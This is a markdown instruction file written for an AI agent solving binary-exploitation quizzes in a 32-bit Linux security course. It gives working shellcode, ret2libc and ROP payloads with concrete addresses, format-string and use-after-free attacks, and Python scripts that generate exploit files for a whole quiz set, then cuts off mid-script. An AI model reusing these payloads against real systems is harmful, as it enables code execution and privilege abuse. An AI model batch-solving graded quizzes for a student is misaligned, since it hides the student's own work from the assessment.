# LLM EXPLOIT INSTRUCTIONS — EPL326 Binary Exploitation
# Read this entire file before attempting any solution.
# This course uses 32-bit Linux ELF binaries. All attacks are x86/i386.

---

## SOLVING APPROACH — 3-TIER ESCALATION

Always start at Tier 1. Only escalate if the current tier fails or the binary doesn't match.

```
TIER 1 — Python script (seconds)
  Condition: display_file + lea -0x30(%ebp) + memcpy + no mmap in main
  Action:    fill in BUF_ADDR via GDB batch, run template script, done
  See:       TEMPLATE section below

TIER 2 — Manual shell recon + GDB (minutes)
  Condition: different offset, mmap gadget-building, unusual binary structure
  Action:    follow STEP 0 → STEP 3 workflow below; build payload by hand

TIER 3 — Decompiler (last resort)
  Condition: logic is too complex to follow from objdump alone
             (e.g. password check gating the vulnerable function,
              obfuscated control flow, unknown input format)
  Tools:     https://dogbolt.org/  (online, paste binary)
             Ghidra (local, File → Import → Analyze)
  Action:    get C pseudocode, identify bypass condition, then return to Tier 1 or 2
```

---

## APPROACH — USE A TAILORED PYTHON SCRIPT, NOT SHELL ONE-LINERS

**The most efficient workflow is:**
1. Run a short recon phase (readelf + one objdump grep) to classify each binary
2. For any RWE binary, run one GDB batch command to get the buffer address
3. Feed those values into a single Python script that generates ALL exploit files
4. Run one verification script that confirms `uid=` for all binaries

This beats iterative shell commands because:
- No escaping bugs (Python handles binary data cleanly with `struct.pack`)
- All exploit files are generated atomically in one run
- The script is self-documenting and reusable across quiz sets
- Only one variable changes per set: the buf addr for the RWE binary

**When you identify the `display_file + lea -0x30 + memcpy` pattern (regina/regina2/tasos style), use this template immediately — do not go through the full step-by-step workflow:**

### TEMPLATE: solve_SETNAME.py

```python
import struct, subprocess, os

# ── CONFIGURE THESE PER SET ──────────────────────────────────────────────────
BASE    = "/mnt/c/Users/andre/Desktop/326_quiz3/quiz3_olla/quiz3_olla/SETNAME"
OFFSET  = 52           # from: lea -0x30(%ebp) → 48 + 4 = 52
                       # change to 56 if lea is -0x34, etc.

# NX-on binaries (GNU_STACK RW) → ret2libc
RET2LIBC_BINS = [1, 3, 4]

# RWE binary → shellcode; buf_addr from GDB batch below
SHELLCODE_BIN = 2
BUF_ADDR      = 0xbfffe2d8   # confirm via GDB — only variable that changes per set

# Known-good libc addresses (WSL2 Ubuntu, TEMP=1000, ASLR off) — constant across sets
SYSTEM  = 0xb7dd58e0
BINSH   = 0xb7f42de8
FAKERET = 0xdeadbeef
# ─────────────────────────────────────────────────────────────────────────────

def p32(v): return struct.pack('<I', v)

SHELLCODE = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'

def write_exploit(path, payload):
    with open(path, 'wb') as f:
        f.write(str(len(payload)).encode() + b' ' + payload)
    print(f"[+] wrote {path}  ({len(payload)} bytes)")

# ret2libc payloads
r2l = b'A' * OFFSET + p32(SYSTEM) + p32(FAKERET) + p32(BINSH)
for n in RET2LIBC_BINS:
    write_exploit(f"{BASE}/exploit.{n}", r2l)

# shellcode payload
sc_pay = SHELLCODE + b'A' * (OFFSET - len(SHELLCODE)) + p32(BUF_ADDR)
write_exploit(f"{BASE}/exploit.{SHELLCODE_BIN}", sc_pay)

print("\n[*] Run verification with:")
print(f"    wsl bash /mnt/c/Users/andre/AppData/Local/Temp/verify_SETNAME.sh")
```

### TEMPLATE: verify_SETNAME.sh (write to Windows temp, run via PowerShell)

```bash
#!/bin/bash
BASE="/mnt/c/Users/andre/Desktop/326_quiz3/quiz3_olla/quiz3_olla/SETNAME"
chmod 755 "$BASE"/bin.*
for n in 1 2 3 4; do
    echo "=== BIN $n ==="
    echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb "$BASE/bin.$n" "$BASE/exploit.$n"
    echo
done
```

### GDB batch to get BUF_ADDR for the RWE binary (write to Windows temp, run via PowerShell):

```bash
#!/bin/bash
# Find ADDR_AFTER_MEMCPY first:
#   objdump -d bin.2 | grep -A1 "call.*memcpy" → next instruction address
BIN="/mnt/c/.../SETNAME/bin.2"
chmod 755 "$BIN"
printf "56 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" > /tmp/t2in
env -i TEMP=1000 HOME=/root PATH=/usr/bin:/bin setarch i686 -R --3gb \
  gdb -batch \
  -ex "b *ADDR_AFTER_MEMCPY" \
  -ex "run /tmp/t2in" \
  -ex "p/x \$ebp - 0x30" \
  "$BIN" 2>&1 | grep '^\$1'
# Output: $1 = 0xbfffe2dX  ← paste this as BUF_ADDR in the Python script
```

### Decision: when to use the template vs full recon

| Condition | Action |
|-----------|--------|
| `display_file` + `lea -0x30(%ebp)` + `memcpy` + no `mmap` in main | **Use template directly** |
| Different buffer offset (`lea -0x3c`, etc.) | Use template, adjust `OFFSET` |
| `mmap` + `movb` gadget-building in main | Full recon — see STEP 0.5 and mmap ROP sections |
| Canary present (`__stack_chk_fail` in objdump) | Full recon — different approach needed |
| PIE binary (`ET_DYN`) | Full recon — need address leak first |

---

## IMMEDIATE STEPS — NEW SESSION (Windows + WSL)

**1. Verify WSL tools (once):**
```powershell
powershell.exe -Command "wsl which gdb objdump readelf setarch"
powershell.exe -Command "wsl dpkg -l libc6-i386 | grep ^ii"
```

**2. Set up WSL GDB environment (once per WSL session):**
```powershell
powershell.exe -Command "wsl bash -c 'printf ""unset environment\nset env TEMP=1000\nset exec-wrapper setarch i686 -R -3\n"" > ~/.gdbinit'"
```

**3. Get binary path and convert to WSL path:**
```
Windows: C:\Users\andre\Desktop\quiz\
WSL:     /mnt/c/Users/andre/Desktop/quiz/
```

**4. ALL multi-step or special-character commands MUST use a script file — never inline:**

> **CRITICAL:** `wsl bash -c '...'` silently breaks when the command contains `<`, `>`, `|`, `$`, or backticks. These are interpreted by the calling shell (Git Bash / PowerShell) before WSL sees them. This is the single most common cause of wasted time. The rule is absolute:
> - **One-liner with no special chars:** `wsl bash -c 'simple command here'` — OK
> - **Anything with pipes, redirects, regex, gdb, objdump grep:** write a script file first

```bash
# CORRECT — write script to Windows temp (accessible from both Windows and WSL):
cat > /mnt/c/Users/andre/AppData/Local/Temp/script.sh << 'EOF'
#!/bin/bash
# your multi-line commands here
objdump -d "$1" | grep -E "^[0-9a-f]+ <"
EOF
powershell.exe -Command "wsl bash /mnt/c/Users/andre/AppData/Local/Temp/script.sh /path/to/binary"

# WRONG — breaks silently due to shell escaping:
# powershell.exe -Command "wsl bash -c 'objdump -d ./bin | grep -E \"^[0-9a-f]+ <\"'"
```

Key paths:
- Windows temp: `C:\Users\andre\AppData\Local\Temp\`
- Same path from WSL: `/mnt/c/Users/andre/AppData/Local/Temp/`
- Use Python scripts the same way: write to Windows temp, run `wsl python3 /mnt/c/.../script.py`

**5. Start recon immediately — no other setup needed:**
```bash
# Write to /tmp/recon.sh then run via PowerShell
file "$BINARY"
readelf -l "$BINARY" | grep GNU_STACK
objdump -d "$BINARY" | sed -n '/<main>/,/<__libc_csu_init>/p'
```

---

## HOST ENVIRONMENT — DETECTED SETUP (update if machine changes)

**Current host:** Windows 11 with WSL2 Ubuntu (`libc6-i386` installed).

**WSL invocation:** Raw `wsl` in Git Bash/MSYS shell prepends the Windows PATH and breaks paths.
Use PowerShell to call WSL reliably:
```powershell
# One-liner:
powershell.exe -Command "wsl bash /path/to/script.sh"

# Write script to /tmp first, then run — most reliable for multi-line commands:
cat > /tmp/exploit.sh << 'EOF'
#!/bin/bash
env -i TEMP=1000 setarch i686 -R --3gb ./binary exploit_file
EOF
powershell.exe -Command "wsl bash /tmp/exploit.sh"
```

**Do NOT use:** `wsl command args` directly from Git Bash — it silently mangles paths.

## MANDATORY ENVIRONMENT — USE THIS FOR EVERY BINARY

```bash
# Run any binary:
env -i TEMP=1000 setarch i686 -R --3gb ./binary [args]

# Run any binary in gdb:
env -i TEMP=1000 HOME=~ PATH=/usr/bin:/bin setarch i686 -R --3gb gdb ./binary

# Lab machines may have a wrapper script — use it if present:
./scripts/run.sh ./binary [args]
```

NEVER run binaries outside this wrapper. ASLR must be disabled and TEMP must be set.
The TEMP variable seeds srandom() inside the binary — without it the stack layout is non-deterministic.

---

## STEP 0 — RECON (always do this first, takes 2 minutes)

```bash
file ./binary
# → 32-bit LSB executable? dynamically linked? not stripped?

readelf -l ./binary | grep GNU_STACK
# RWE = stack executable → shellcode injection works
# RW  = NX on            → try ret2libc first, then ROP

readelf -h ./binary | grep Type
# ET_EXEC = no PIE → fixed addresses (good, use addresses directly)
# ET_DYN  = PIE    → addresses randomized (need leak first)

objdump -d ./binary | grep -E "^[0-9a-f]+ <"
# lists all function names and their addresses

objdump -d ./binary | grep stack_chk
# if __stack_chk_fail appears → stack canary present → harder to exploit
```

---

## STEP 0.5 — READ main() FULLY BEFORE TOUCHING THE VULNERABILITY

After recon, **always disassemble `main()` completely** before jumping to the vulnerable function.
`main()` may set up exploit infrastructure that changes your entire approach.

```bash
objdump -d ./binary | sed -n '/<main>/,/<__libc_csu_init>/p'
```

Look for calls to:
- `mmap()` — the binary may be mapping an **RWX region at a fixed address** and copying
  gadgets or shellcode into it. If so, your return address should point there, not to the stack.
- `malloc()` followed by byte-by-byte `movb` writes — the binary is **building its own ROP
  gadgets in memory** and placing them at a predictable location. Decode each byte:
  ```bash
  # Extract the movb values in order:
  objdump -d ./binary | sed -n '/<main>/,/<__libc_csu_init>/p' | grep 'movb.*0x'
  # Each value is one byte of the gadget buffer. Read them in offset order (+0, +1, +2…)
  # and decode as x86 instructions.
  ```
- `getpagesize()` + arithmetic on a hardcoded address — the binary is computing the **mmap
  base address** deterministically. Formula: `(hardcoded_addr / pagesize - 0x1000) * pagesize`
- `getenv("TEMP")` / `atoi()` stored as uid — TEMP=1000 controls where gadgets land.
  `offset(uid)` wraps the value into a range; gadgets go at `mmap_base + offset(uid)`.

### If mmap + gadgets are found — decode the gadget table:

```python
# After reading all movb values in offset order, decode like this:
# [+0 +1 +2] = one gadget (usually 2-byte instruction + 0xc3 ret)
# Common patterns:
#   31 c0 c3 → xor eax,eax; ret
#   58 5b c3 → pop eax; pop ebx; ret
#   89 03 c3 → mov [ebx],eax; ret
#   31 c9 c3 → xor ecx,ecx; ret
#   89 c3 c3 → mov ebx,eax; ret  (copies EAX into EBX)
#   b0 0b c3 → mov al,0xb; ret
#   31 d2 c3 → xor edx,edx; ret
#   cd 80 c3 → int 0x80; ret

# Gadget address = mmap_base + offset(TEMP_value) + byte_offset_in_table
```

> **Warning:** Different binaries in the same quiz can have the **same gadgets in a different
> order**. Always decode the byte layout fresh for each binary — never copy gadget addresses
> between binaries without checking. A silently wrong gadget address causes a crash with no
> output, identical to a wrong offset.

---

## STEP 1 — IDENTIFY THE VULNERABILITY

Run `objdump -d ./binary` and look for these patterns:

### A) Stack Buffer Overflow
```
call strcpy     ← no bounds check, overflows stack buffer
call gets       ← no bounds check at all
call memcpy     ← overflow if size is user-controlled
```
Look for a function that:
- Allocates a small local buffer (e.g. `sub $0x38, %esp`)
- Calls one of the above with user-controlled input/size
- Has no stack canary check (no `__stack_chk_fail` call)

### B) Format String
```
call printf     ← if the argument is user input directly (not a format string literal)
call fprintf
call sprintf
```
Look for user input being passed as the FIRST argument to printf (in %eax or pushed directly).

### C) Use-After-Free (UAF)
```
call operator.new / malloc   ← allocation
call operator.delete / free  ← deallocation  
... later ...
mov eax, [ptr]               ← use of freed pointer
call [eax]                   ← virtual dispatch through dangling vtable pointer
```

### D) Heap Overflow
```
malloc(small_size)
memcpy(heap_buf, input, user_controlled_size)  ← overflows into adjacent heap chunk
```

---

## STEP 2 — FIND THE OFFSET (gdb)

### For stack buffer overflow:

```bash
env -i TEMP=1000 HOME=~ PATH=/usr/bin:/bin setarch i686 -R --3gb gdb ./binary
```

```gdb
(gdb) b vulnerable_function      # break at the function entry
(gdb) r [input or file]
(gdb) disas                      # find the dangerous call (strcpy/memcpy/etc)
(gdb) b *0xADDR_AFTER_CALL       # break on the instruction immediately after it
(gdb) c
(gdb) info registers ebp         # note EBP value, e.g. 0xbfffe308
```

From the disassembly, find `sub $0xNN, %esp` at the function start.
The local buffer offset is visible from the instruction that passes the buffer to the call:
```
lea -0x30(%ebp), %eax    ← buffer is at ebp-0x30 = ebp-48
push %eax
call memcpy
```

**Offset to return address = (EBP - buf_start_address) + 4**

Example: buffer at ebp-0x30 (48 bytes):
- Distance from buf start to saved EBP = 0x30 = 48
- Add 4 for saved EBP itself
- Offset = **52**

### Verify offset with a cyclic pattern:
```python
# Create cyclic.py:
import sys
pat = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO'
size = len(pat)
with open('cyclic_input', 'wb') as f:
    f.write(str(size).encode() + b' ' + pat)
```
```bash
# Run and check what value EIP has on crash:
env -i TEMP=1000 HOME=~ PATH=/usr/bin:/bin setarch i686 -R --3gb gdb ./binary
(gdb) r cyclic_input
# EIP = 0x4e4e4e4e → "NNNN" → offset = position of 'N' in pattern = 52
```

---

## STEP 3 — CHOOSE YOUR ATTACK

```
GNU_STACK = RWE  AND  no canary  →  SHELLCODE INJECTION  (Section A below)

GNU_STACK = RW   AND  no canary  →  Try in this order:
   1. RET2LIBC  (Section B) — almost always works, no gadgets needed
   2. ROP CHAIN (Section C) — only if libc addresses are unavailable

printf(user_input) visible       →  FORMAT STRING        (Section D below)
delete + malloc + virtual call   →  UAF VTABLE HIJACK    (Section E below)
```

---

## SECTION A — SHELLCODE INJECTION
**When:** stack is executable (RWE), no canary, ASLR off
**Examples from course:** stack-smash2.c, bin.0, bin.2

### Shellcode (always use this — 23 bytes, no null bytes):
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
```
What it does: `execve("/bin//sh", NULL, NULL)` — spawns a shell.

### Payload structure:
```
[shellcode 23B][padding X bytes][return_address 4B little-endian]
padding = offset_to_retaddr - 23
```

### For argument-based binaries (like stack-smash2):
```bash
./binary `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80[PADDING][RETADDR]"`
```

### For file-based binaries (like bin.0, bin.2):
```bash
# fscanf reads "SIZE " then fgetc reads SIZE bytes
printf "TOTAL_SIZE \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80[PADDING][RETADDR]" > file.X
./scripts/run.sh ./binary file.X
```

### Getting the return address (= address of local_buf):
```gdb
(gdb) info registers ebp        # e.g. 0xbfffe308
# buf_addr = EBP - buffer_offset_from_disasm
# e.g. EBP=0xbfffe308, buffer at ebp-0x30 → buf_addr = 0xbfffe2d8
```

Convert to little-endian:
```bash
python3 -c "import struct; print(struct.pack('<I',0xbfffe2d8).hex())"
# d8e2ffbf  →  \xd8\xe2\xff\xbf
```

### Python payload builder:
```python
import struct

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
offset    = 52              # replace with your offset
buf_addr  = 0xbfffe2d8      # replace with address from gdb

payload = shellcode + b'A' * (offset - len(shellcode)) + struct.pack('<I', buf_addr)
with open('exploit', 'wb') as f:
    f.write(str(len(payload)).encode() + b' ' + payload)
```

### Verify (non-interactive test):
```bash
echo 'id' | ./scripts/run.sh ./binary exploit_file 2>/dev/null
# should print: uid=1000(...) — confirms shell execution
```

---

## SECTION B — RET2LIBC (★ TRY THIS FIRST WHEN NX IS ON ★)
**When:** stack is NOT executable (NX on, GNU_STACK = RW), no canary, ASLR off
**Examples from course:** bin.1, bin.3, bin.4

This is **simpler than a full ROP chain** — you only need two addresses from libc.
No gadget hunting required. Works on any binary that loads libc.

### Concept:
Overwrite the return address with `system()`. Set up the stack so system() gets
`"/bin/sh"` as its argument.

```
Stack after overflow:
  [ret addr → system()][fake ret for after system][ptr to "/bin/sh"]
```

### Step 1 — Find addresses (30 seconds in gdb):
```gdb
(gdb) b main
(gdb) r [any valid input, even /dev/null]
(gdb) p system
# $1 = {<text variable>} 0xb7dd58e0 <system>

(gdb) find &system, +99999999, "/bin/sh"
# 0xb7f42de8
# 1 pattern found.
```

### Step 2 — Craft payload:
```python
import struct

offset  = 52              # replace with your offset to return address
system  = 0xb7dd58e0     # replace with address from gdb
binsh   = 0xb7f42de8     # replace with address from gdb

pad     = b'A' * offset
fakeret = struct.pack('<I', 0xdeadbeef)   # crash after shell exits — fine
payload = pad + struct.pack('<I', system) + fakeret + struct.pack('<I', binsh)

with open('exploit', 'wb') as f:
    f.write(str(len(payload)).encode() + b' ' + payload)
```

### Step 3 — Launch and verify:
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./binary exploit
# → uid=1000(andre) ...   (then segfault on 0xdeadbeef — this is expected and fine)
```

### Why the segfault at the end is OK:
`system()` runs your shell, the shell executes `id`, prints the result, then exits.
`system()` returns to `0xdeadbeef` which crashes. But the shell already ran — **success**.

### Confirmed addresses (TEMP=1000, ASLR off, this libc version):
| Symbol | Address |
|--------|---------|
| `system()` | `0xb7dd58e0` |
| `"/bin/sh"` | `0xb7f42de8` |

> If these don't work on the lab machine, re-run `p system` and `find` in gdb on that machine.

---

## SECTION C — RETURN-ORIENTED PROGRAMMING (ROP)
**When:** NX on, no canary, ASLR off, AND ret2libc is not viable
(e.g. libc not mapped, ASLR on with no leak, or binary has no libc dependency)
**Examples from course:** rop.c

### Concept:
Chain existing code snippets ("gadgets") that each end in `ret`.
Goal: build `execve("/bin//sh", NULL, NULL)` without injecting new code.

### Find gadgets:
```bash
objdump -d ./binary | grep -B5 "ret"
# look for: pop eax/ret, pop ebx/ret, xor eax eax/ret, mov $0xb %al/ret, int $0x80/ret

# Or use ROPgadget:
ROPgadget --binary ./binary --rop
```

### Check if int 0x80 exists (required for execve syscall):
```bash
objdump -d ./binary | grep "int.*0x80"
# if nothing → no syscall gadget → use ret2libc instead
```

### Required register state for execve syscall:
```
eax = 0xb          (syscall number 11)
ebx = ptr to "/bin//sh" string (must exist in writable memory)
ecx = 0            (NULL argv)
edx = 0            (NULL envp)
→ int $0x80
```

### Chain structure (fill in addresses from objdump):
```
[padding to reach ret addr]
[addr: pop eax; pop ebx; ret]   ← gadget 1
["/bin"]                         ← popped into eax
[writable_addr]                  ← popped into ebx
[addr: mov eax,(ebx); ret]      ← write "/bin" to writable memory
[addr: pop eax; pop ebx; ret]
["//sh"]                         ← popped into eax
[writable_addr+4]
[addr: mov eax,(ebx); ret]      ← write "//sh" to writable memory
[addr: mov eax,ebx; ret]        ← ebx = writable_addr (ptr to "/bin//sh")
[addr: xor ecx,ecx; ret]        ← ecx = 0
[addr: xor edx,edx; ret]        ← edx = 0
[addr: mov $0xb,%al; ret]       ← eax = 11
[addr: int $0x80; ret]          ← SYSCALL → shell
```

### Find a writable address:
```bash
readelf -S ./binary | grep -E "\.data|\.bss"
# use any address in .data or .bss section (they are writable)
```

### Working example from rop.c (addresses are binary-specific):
```bash
./rop `printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xce\x84\x04\x08\x2f\x62\x69\x6e\x24\xa0\x04\x08\xe0\x84\x04\x08\xce\x84\x04\x08\x2f\x2f\x73\x68\x28\xa0\x04\x08\xe0\x84\x04\x08\xcf\x84\x04\x08\x24\xa0\x04\x08\xd7\x84\x04\x08\xf2\x84\x04\x08\xfb\x84\x04\x08\x04\x85\x04\x08\x0d\x85\x04\x08"`
```
**This payload is specific to rop.c — for a new binary you must find new gadget addresses.**

---

## SECTION D — FORMAT STRING VULNERABILITY
**When:** `printf(user_input)` — user controls format string directly
**Examples from course:** string-fmt.c

### Identify it:
```bash
objdump -d ./binary | grep -B10 "call.*printf"
# if the argument pushed before printf is from argv or user input = vulnerable
```

### Leak stack values (read memory):
```bash
./binary "%x.%x.%x.%x.%x.%x.%x.%x"
# each %x reads one 4-byte word off the stack
# program usually prints marker addresses first — match them against %x output
```

### Find which stack position holds what you want:
```bash
./binary "%1\$x"   # 1st stack word
./binary "%2\$x"   # 2nd stack word
./binary "%6\$x"   # 6th stack word — keep incrementing until you see target value
```

### Write to memory with %n:
```
%n  writes the count of bytes printed so far into the address pointed to by the next argument
```
```bash
# To write value V to address ADDR:
# 1. Put ADDR at start of format string (4 bytes, little-endian)
# 2. Print exactly V bytes using %Nc padding
# 3. Use %n to write the count into ADDR

./binary `printf "\xAD\xDE\x00\x00%Nc%n"`
#                 ^target addr^   ^N controls value written^
```

### Practical approach:
1. Program prints marker addresses like `0xbfffe2b4`
2. Use `%x.%x.%x...` until one of those values appears in the output
3. That position = the stack offset you can read/write

---

## SECTION E — USE-AFTER-FREE + VTABLE HIJACKING
**When:** C++ binary with virtual methods, object is deleted then re-allocated
**Examples from course:** uaf.cpp

### How C++ vtables work:
```
Heap object layout:
  [vtable_ptr 4B][object fields...]
   ↓
vtable (read-only .rodata):
  [ptr to method0]
  [ptr to method1]  ← virtual dispatch reads from here
  [ptr to method2]
```

### The UAF pattern:
```cpp
WelcomeMessage *w = new SomeClass();  // allocates heap chunk, vtable_ptr at offset 0
w->method();                           // calls through vtable
delete w;                              // frees chunk — but pointer still valid!
char *buf = (char*)malloc(sizeof *w);  // gets SAME heap chunk back
strncpy(buf, argv[1], 4);             // overwrites first 4 bytes = vtable pointer
w->method();                           // now dispatches through OUR fake vtable
```

### Exploit steps:
```bash
# Step 1: find the vtable addresses
gdb ./binary
(gdb) b main
(gdb) r [any valid input]
(gdb) info vtbl object_variable     # shows vtable layout
# vtable for 'ClassName' @ 0x804a0a4
# [0]: 0x0804935c <cleanup()>
# [1]: 0x08049390 <AdminWelcomeMessage::print()>

# Step 2: the vtable address + offset points to the function you want
# To call method[1] instead of method[0]:
# pass vtable_addr + 4 as argv[1] (4 bytes, the vtable ptr now points to entry [1])
./binary `printf "\xa8\xa0\x04\x08"`
#                  ^vtable_addr+4 in little-endian^
```

### Finding the right address to pass:
```gdb
(gdb) info vtbl w                        # see full vtable
(gdb) x/4xw 0x804a0a4                   # inspect vtable entries manually
# vtable+0  = method[0] address
# vtable+4  = method[1] address   ← pass this as argv[1] to call method[1]
# vtable+8  = method[2] address
```

---

## SECTION F — ASLR AND PIE AWARENESS

### Check ASLR status on the machine:
```bash
cat /proc/sys/kernel/randomize_va_space
# 0 = off (addresses fixed)
# 1 or 2 = on (addresses randomized each run)
```

### Disable ASLR for a single run (what our wrapper does):
```bash
setarch i686 -R ./binary    # -R = --addr-no-randomize
```

### PIE vs no-PIE:
```
no-PIE (ET_EXEC): code always at same address (e.g. 0x08048000)
   → use addresses from objdump directly

PIE (ET_DYN): code base randomized
   → need an info leak first to find where code is loaded
   → format string vulnerability is the usual leak source
```

### Observe ASLR effect:
```bash
# Run the program twice — if stack/heap addresses change = ASLR on
cat /proc/[pid]/maps   # see mymaps.c for how to read this
```

---

## SECTION G — IF STUCK: USE A DECOMPILER

If the binary has complex logic you can't follow from `objdump` alone (e.g. a password
check that must pass before the vulnerable function is reached), use a decompiler:

```
Online: https://dogbolt.org/  — paste your binary, get C pseudocode
Local:  Ghidra (free, NSA tool) — File → Import → Analyze → Functions window
```

Look for:
- Functions named `authenticate`, `check_password`, `validate` — bypass conditions
- Calls to `strcmp`, `strncmp` — hardcoded passwords
- Conditions that gate access to `display_file` or the vulnerable function

---

## QUICK DECISION TREE

```
1. Is the stack executable?
   readelf -l binary | grep GNU_STACK
   → RWE?  YES → SHELLCODE INJECTION (Section A)
   → RW?   YES → go to step 2

2. Is ASLR off? (setarch -R wrapper disables it)
   → YES → RET2LIBC first (Section B)
            p system + find "/bin/sh" in gdb → done in <5 min
   → NO  → need address leak first (format string, etc.)

3. Ret2libc didn't work? (no libc, or addresses wrong)
   → Check for int 0x80 + pop/xor gadgets → ROP CHAIN (Section C)

4. Is there a printf(user_input)?
   → YES → FORMAT STRING (Section D)
   → Useful to leak addresses if ASLR is on

5. Is it C++ with delete + malloc + virtual call?
   → YES → UAF VTABLE HIJACK (Section E)

6. Is there a stack canary?
   objdump -d binary | grep stack_chk
   → YES → format string leak or heap attack needed to bypass
```

---

## UNIVERSAL GDB COMMAND REFERENCE

```gdb
# Setup
set architecture i386             # force 32-bit mode if gdb complains
set disassembly-flavor att        # AT&T syntax (matches course materials)

# Run
r [args]                          # run with arguments
r < inputfile                     # run with stdin from file

# Breakpoints
b function_name                   # break at function entry
b *0x08048574                     # break at exact address
d 1                               # delete breakpoint 1
info breakpoints

# Execution
c                                 # continue
ni                                # next instruction (step over calls)
si                                # step into calls
finish                            # run until function returns

# Inspect registers
info registers                    # all registers
info registers ebp eip esp        # specific registers
p/x $ebp                          # print ebp as hex
p/x $ebp - 0x30                   # arithmetic on register

# Inspect memory
x/32xw $ebp-60                    # 32 words (4B each) around ebp
x/32xb $esp                       # 32 bytes from stack pointer
x/s 0x08048500                    # print memory as string
x/i $eip                          # print current instruction

# Find things
info functions                    # list all functions
info sym 0x08048574               # what is at this address
info vtbl varname                 # C++ vtable of an object
p system                          # address of system()
find $esp, +1000, "/bin/sh"       # search memory for string
find &system, +99999999, "/bin/sh" # find /bin/sh anywhere in libc
```

---

## COMMON MISTAKES TO AVOID

1. **Running outside the wrapper** — always use `env -i TEMP=1000 setarch i686 -R --3gb`
2. **Trying shellcode when NX is on** — check `GNU_STACK` first; RW = no shellcode
3. **Building a full ROP chain before trying ret2libc** — ret2libc is faster and needs only 2 addresses
4. **Null bytes in shellcode** — the given shellcode has none; custom shellcode must avoid `\x00`
5. **Wrong endianness** — x86 is little-endian: address `0xbfffe2e4` → `\xe4\xe2\xff\xbf`
6. **Off-by-one on offset** — offset = (EBP - buf_start_addr) + 4, not just the buffer size
7. **gdb vs real run addresses differ** — always run gdb INSIDE the same setarch wrapper
8. **PIE binary** — if ET_DYN, addresses shift each run; need a leak before crafting payload
9. **strcpy stops at \x00** — if overflow is via strcpy, payload cannot contain null bytes
10. **fgetc/memcpy handle \x00 fine** — if overflow is via fgetc+memcpy, null bytes are ok
11. **Suppressing stderr hides success** — use `echo 'id' | ./run.sh ./binary exploit` without `2>/dev/null` to see shell output
12. **Skipping main() analysis** — `main()` may call `mmap()` and build ROP gadgets dynamically at a fixed address. If you jump straight to the vulnerable function without reading `main()`, you'll miss the intended exploit path entirely (ret2libc will still work, but you won't understand *why* the binary was designed that way)
13. **Reusing gadget addresses between binaries** — even binaries in the same quiz set can have the same gadgets at different offsets. A chain that works on bin.3 may silently crash on bin.4 because two gadgets are swapped. Decode the `movb` table fresh for each binary
14. **init_data() corrupts BSS writable memory** — some binaries call an `init_data()` function before `main()` that pre-fills the `.bss` section with `0xffffffff`. Writing "/bin//sh" to a BSS address that is followed by `0xffffffff` gives a non-null-terminated string → execve returns -1 silently. Fix: use the mmap RWX region itself as writable space (it is zeroed by MAP_ANONYMOUS and lies well past your gadget bytes). Use `mmap_base + 0x500` as a safe writable address.
15. **Binary structure varies between quiz iterations** — the same binary names (bin.1–bin.4) can use entirely different attack paths across different quiz sets. One set's bin.3 may be ret2libc; another set's bin.3 may require mmap ROP. Always re-run full recon (Steps 0–0.5) for each new set.
16. **BSS writable region may be poisoned by uid/TEMP value** — even without `init_data()`, the magic_value (uid/TEMP) is stored in `.bss` near the beginning. In the 1048972 set, `0x804a064` = TEMP = 1000 = 0x3e8. If `wr = 0x804a05c`, the string "/bin//sh" ends at `wr+8 = 0x804a064` which contains 0x3e8, not 0x00 → execve gets "/bin//sh\xe8\x03" (not null-terminated) → ENOENT. **Always use the mmap region (`mmap_base + 0x500`) as writable for ALL ROP chains involving mmap**, regardless of whether init_data is present. It is always zeroed by MAP_ANONYMOUS.
17. **bin.0 may be a non-exploitable "warm-up" binary** — in some quiz sets, bin.0 just prints argv[1] via `fprintf(stderr, "...", argv[1])` with no overflow, no memcpy, no file reading. When bin.0 has no display_file function and no `file.0` in the directory, it is not exploitable via standard overflow. Create exploit.0 as any dummy file and run `./bin.0 exploit.0`; the binary prints "Congratulations!" to stderr. The `echo 'id' |` confirm will NOT produce uid= for this binary.
18. **Buffer offset varies between quiz sets** — in some sets display_file allocates `ebp-0x30` (buffer=48B, offset to ret=52), in others `ebp-0x34` (buffer=52B, offset=56). **Always read the `lea -0xNN(%ebp), %eax` before the memcpy call to determine the actual buffer offset.** Do not assume offset=52 across sets.
19. **Dummy memcpy calls in main() are decoys** — some quiz sets (confirmed: regina 2, tasos bin.3/bin.4) add extra `memcpy` calls inside `main()` to create analysis confusion. These do not change the exploit. The real vulnerability is always inside `display_file`. Read `main()` for mmap/gadget logic (which matters), but ignore extra memcpy calls in main — they are red herrings.
20. **bin.2 buffer address varies between quiz sets** — the shellcode return address (`$ebp - 0x30`) is not constant. Confirmed values: regina=`0xbfffe2e8`, regina2=`0xbfffe2d8`, tasos=`0xbfffe2d8`. Always confirm via GDB batch for each new set. The 16-byte difference between sets is due to different amounts of environment/stack setup in each compiled binary.

---

## FAST PATH — display_file PATTERN (regina / regina2 / tasos style)

If recon shows:
- `objdump` has a `display_file` function with `memcpy` and `lea -0x30(%ebp)` before it
- No `mmap()` or `movb` gadget-building in `main()`
- No `__stack_chk_fail` (no canary)

Then you already know: **offset = 52** for all binaries. Apply this pipeline immediately without further analysis:

```
bin.1, bin.3, bin.4 → GNU_STACK RW  → ret2libc (no GDB needed)
bin.2               → GNU_STACK RWE → shellcode (GDB batch to get buf addr)
```

### Python script — generates all 4 exploit files in one shot:

```python
import struct

BASE = "/mnt/c/Users/andre/Desktop/326_quiz3/quiz3_olla/quiz3_olla/SETNAME"

def p32(v): return struct.pack('<I', v)

offset  = 52
